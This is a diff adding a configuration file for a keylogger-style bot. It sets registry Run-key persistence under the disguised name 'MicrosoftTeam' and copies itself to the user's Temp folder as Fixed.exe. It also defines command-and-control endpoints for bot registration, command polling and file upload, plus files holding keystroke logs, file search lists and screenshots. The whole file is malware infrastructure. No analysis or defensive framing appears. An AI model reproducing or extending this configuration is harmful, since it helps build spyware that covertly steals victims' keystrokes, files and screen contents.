@@ -1,0 +1,27 @@
+[REG]
+KEY_PATH = "Control Panel\Colors";
+KEY_NAME = "Fixed";
+AUTORUN_PATH = "Software\Microsoft\Windows\CurrentVersion\Run";
+AUTORUN_NAME = "MicrosoftTeam";
+COPY_PATH = "C:\Users\%s\AppData\Local\Temp\Fixed.exe";
+COPY_PATH_2000_xp = "C:\Documents and Settings\%s\\Local Settings\Temp\Fixed.exe";
+
+[C&C]
+ADDRESS = L"127.0.0.1";
+PORT = 80;
+POST_PATH = "/logger/post.php?bot_id = %s&cmd = %s&status = %s";
+COMMAND_PATH = "/logger/command.php?bot_id=%s&os=%s&hostname=%s&time=%s";
+UPLOAD_PATH = "/logger/upload.php?bot_id=%s&cmd=%s&path=%s";
+
+[HTTP]
+GET = "GET";
+POST = "POST";
+POST_HEAD = "Content-Type: multipart/form-data; boundary=----1211\r\n\r\n";
+POST_HEAD_BEGIN = "------1211\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n\r\n";
+POST_HEAD_END = "\r\n------1211--";
+
+[FILE]
+KEYLOG = "keylog.tmp";
+SEARCH = "listfile.tmp";
+SEARCH_UPLOADED = "tempfile.tmp";
+SCREENSHOT ="scr.jpg";
